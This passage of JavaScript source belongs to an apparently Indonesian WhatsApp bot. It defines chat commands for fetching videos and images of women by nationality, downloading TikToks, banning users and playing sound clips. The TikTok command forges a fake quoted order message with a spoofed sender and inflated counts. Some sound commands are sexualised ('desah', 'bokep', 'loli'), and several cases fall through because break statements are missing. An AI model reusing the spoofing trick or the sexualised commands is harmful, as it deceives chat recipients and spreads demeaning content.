▸ Desc update at : ${res.content[0].content[0].attrs.t ? moment(res.content[0].content[0].attrs.t * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Desc id : ${res.content[0].content[0].attrs.id ? res.content[0].content[0].attrs.id : "undefined"}
▸ Description : ${res.content[0].content[0].content[0].content ? res.content[0].content[0].content[0].content.toString() : "No Description"}
`
try {
pp = await rikibos.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
rikibos.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await rikibos.parseMention(tekse) })
})
}
break
//=================================================//
case 'asupan':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/random`
rikibos.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted:m})
break
//=================================================//
case 'asupanukhty':
case 'asupan-ukhty':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/ukhty`
rikibos.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted:m})
break
//=================================================//
case 'asupan-santuy':
case 'asupansantuy':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/santuy`
rikibos.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Ini Kak Jangan Lupa Donasi Ya:)"}, {quoted:m})
break
//=================================================//
case 'hijaber':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/hijaber`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-indo':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/indonesia`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-malaysia':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/malaysia`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-thai':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/thailand`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-vietnam':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/vietnam`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-korea':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/korea`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan-jepan':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/japan`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'cecan':
if (isBan) throw sticBanLu(from)
teks = `nih Kak >\\<`
buffer = `https://api.zacros.my.id/asupan/cecan`
rikibos.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case 'ban': case 'banned': {
if (!isRegistered) return replyReg(mess.verif)
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
if (!args[0]) return reply(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*User has been banned*')
banned.push(orgnye)
reply(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Success Removing Banned Users*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'tiktok': case 'tiktoknowm':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
reply(mess.wait)
owned = '6287741097274'
mbc = `Nih Kak @${sender.split("@")[0]} `
let buttoons = [
{buttonId: `${prefix}tiktokmp3 ${q}`, buttonText: {displayText: 'Audio'}, type: 1}
]
let buttonooMessage = {
video: krt, 
jpegThumbnail: log0,
caption: mbc,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtube.com/c/katanamods',
"sourceUrl": 'https://youtube.com/c/katanamods'
}}
}
rikibos.sendMessage(m.chat, buttonooMessage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "14169948404-1305080833@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'RIK OHHz',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
break
 //=================================================//
case 'tiktokmp3': case 'tiktokaudio': { 
if (isBan) throw sticBanLu(from)
if (!text) throw '*Enter Link Tiktok!*'
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) throw '*The link you provided is not valid*'
let got = require('./rikilah/lib/tiktok.js')
got.tiktokDown(`${text}`).then(async (data) => {
rikibos.sendMessage(m.chat, { audio: { url: data.result.nowatermark }, mimetype: 'audio/mp4'}, { quoted: rik })
}).catch((err) => {
reply(`*Failed to download media and send audio*`)
})
 }
 break
 //=================================================//
case 'ttaudio':
case 'ttmusic':{
if (isBan) throw sticBanLu(from)
/*if (isLimit < 1) return reply("Limit kamu sudah habis , silahkan beli dengan cara #buy limit _jumlah_")
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(`Satu limit terpakai\nSisa limit kamu : ${global.db.data.users[m.sender].limit}`)*/
if (!q) return reply('Linknya?')
if (!q.includes('tiktok')) return reply('Itu bukan link tiktok!')
const musim_rambutan = await TiktokDownloader(`${q}`).catch(e => {
 m.reply(pesan.eror) 
} )
console.log(musim_rambutan)
const musim_duren_a = musim_rambutan.result.nowatermark
 rikibos.sendMessage(from, { audio: { url: musim_duren_a }, mimetype: 'audio/mp4' }, { quoted: m })
}
 break
//=================================================//
case 'tt':{
/*if (isLimit < 1) return reply("Limit kamu sudah habis , silahkan beli dengan cara #buy limit _jumlah_")
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(`Satu limit terpakai\nSisa limit kamu : ${global.db.data.users[m.sender].limit}`)*/
if (!q) return reply('Linknya?')
sticWait(from)
if (!q.includes('tiktok')) return reply('Itu bukan link tiktok!')
const musim_rambutan = await TiktokDownloader(`${q}`).catch(e => {
 m.reply(pesan.eror) 
} )
console.log(musim_rambutan)
const musim_duren_v = musim_rambutan.result.watermark
 rikibos.sendMessage(from, { video: { url: musim_duren_v }, caption: `Anda Bisa Mengubah Menjadi Nonw Dengan Mengetik\n.tiktoknowm ${q}` }, { quoted: m })
}
break
//=================================================//
case 'ttnowm':{
if (isBan) throw sticBanLu(from)
/*if (isLimit < 1) return reply("Limit kamu sudah habis , silahkan beli dengan cara #buy limit _jumlah_")
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(`Satu limit terpakai\nSisa limit kamu : ${global.db.data.users[m.sender].limit}`)*/
if (!q) return reply('Linknya?')
sticWait(from)
if (!q.includes('tiktok')) return reply('Itu bukan link tiktok!')
const musim_rambutan = await TiktokDownloader(`${q}`).catch(e => {
 m.reply(pesan.eror) 
} )
console.log(musim_rambutan)
const musim_duren_v = musim_rambutan.result.nowatermark
 rikibos.sendMessage(from, { video: { url: musim_duren_v }, caption: "Done!" }, { quoted: m })
}
break
//=================================================//
case 'searchgroups':
if (isBan) throw sticBanLu(from)
if (!q) return reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
reply(res)
});
break
//=================================================//
case 'ada apa': case 'apaa': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/adapa.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'anjay': case 'anjrr': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/anjay.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'gabahagia': case 'terpaksa': case 'gacinta': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/terpaksa.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'anjing': case 'ajg': case 'anjg': case 'anj': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/anjing.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'apa': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/apa.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'asalamualaikum': case 'p': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/assalamualaikum.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'bohong': case 'boong': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/bohong.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'bokep': case 'porno': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/bokep.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'tes': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/bot.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'caper': case 'carmuk': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/caper.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'desah': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 case 'desah2': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah2.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'desah3': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah3.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 case 'desah4': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah4.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'desah5': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah5.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 case 'desah6': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah6.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'desah7': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah7.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 case 'desah8': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/desah8.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'diem': case 'diam': case 'berisik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/diem.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'gajelas': case 'gjls': case 'gaje': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/gajelas.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'insaf': case 'insap': case 'astagfirullah': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/insaf.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'jagoan': case 'wih jagoan': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/jagoan.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kenapa': case 'kenapa bang': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/kenapa.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kuntilanak': case 'kunti': case 'hantu': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/kuntilanak.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'lonte': case 'ngelonte': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/lonte.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'lu siapa': case 'siapa ya': case 'siapa': case 'siapa?': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/lusiapa.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'menangis': case 'nangis': case 'mewek': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/menangis.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ngeri': case 'ngeri bang': case 'ngeri om': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/ngeri.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'otaknya mana': case 'otaknya dimana': case 'otaknya dmn': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/otaknya.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kaga peduli': case 'ga peduli': case 'gapeduli': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/peduli.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'save doang': case 'cuman save': case 'save': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/savedoang.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'seleb': case 'selep': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/seleb.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'dahlah': case 'hm': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/dahlah.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'sini dek': case 'sini': case 'sinidek': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sinidek.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'sok asik': case 'sokap': case 'soken': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sokasik.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'sok keras': case 'soker': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sokkeras.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'tapi boong': case 'tapi bohong': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/tapibohong.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'tetew': case 'teteww': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/tetew.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'tidak takut': case 'ga takut': case 'kaga takut': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/tidaktakut.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'sakit': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/sakit.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'aduh': case 'sakittau': case 'duh': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/aduh.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ahh': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hey = fs.readFileSync('./Musik/sound/ahh.mp3')
 rikibos.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ngakak': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hiy = fs.readFileSync('./Musik/sound/ketawa.mp3')
 rikibos.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ketawa': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 hoy = fs.readFileSync('./Musik/sound/ketawa.mp3')
 rikibos.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'wkwk': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/wkwk.mp3')
 rikibos.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'cakep': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/chan.mp3')
 rikibos.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
 case 'gatau': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/jokowi.mp3')
 rikibos.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kocok': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/kocok.mp3')
 rikibos.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'minggir': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/minggir.mp3')
 rikibos.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'loli': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/loli.mp3')
 rikibos.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'asik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 huy = fs.readFileSync('./Musik/sound/asik.mp3')
 rikibos.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'bang': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 mi = fs.readFileSync('./Musik/sound/bang.mp3')
 rikibos.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'nob': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 miki = fs.readFileSync('./Musik/sound/nob.mp3')
 rikibos.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'musik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 mo = fs.readFileSync('./Musik/sound/musik.mp3')
 rikibos.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'mastah': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 mu = fs.readFileSync('./Musik/sound/mastah.mp3')
 rikibos.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'slebew': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 me = fs.readFileSync('./Musik/sound/ikehcok.mp3')
 rikibos.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'cantik': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 muku = fs.readFileSync('./Musik/sound/loli.mp3')
 rikibos.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'kesel': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 meke = fs.readFileSync('./Musik/sound/kesel.mp3')
 rikibos.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
 break
case 'ngeselin': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 moko = fs.readFileSync('./Musik/sound/ngeselin.mp3')
 rikibos.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
case 'ohh': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
 moko = fs.readFileSync('./Musik/sound/ohh.mp3')
 rikibos.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted: riki})
 }
break
//=================================================//
case 'once': case 'toonce': { //by DRIPS
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await rikibos.downloadAndSaveMediaMessage(quoted)
rikibos.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: rik })
} else if (/video/.test(mime)) {
anu = await rikibos.downloadAndSaveMediaMessage(quoted)
rikibos.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: rik })
}
}
break
//=================================================//
case 'anime': {
if (isBan) throw sticBanLu(from) 
if (!text) return m.reply(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
anu = await fetchJson(`https://api.jikan.moe/v4/anime?q=${text}`)
let sections = [] 
for (let i of anu.data) {
const list = {title: `${i.title}`,
rows: [
{
 title: `${i.title}`, 
 rowId: `${prefix}animee ${i.mal_id}`,
 description: `${i.synopsis}`
}, 
]
}
sections.push(list) 
}
const sendm =rikibos.sendMessage(
 m.chat, 
 {
text: `*Search Results From* ${text}`,
footer: botname,
title: "*▊▊▊ANIME▊▊▊*",
buttonText: "CLICK HERE",
sections
 }, { quoted : m })
}
break
//=================================================//
case 'translate': case 'terjemahan': case 'tr': {
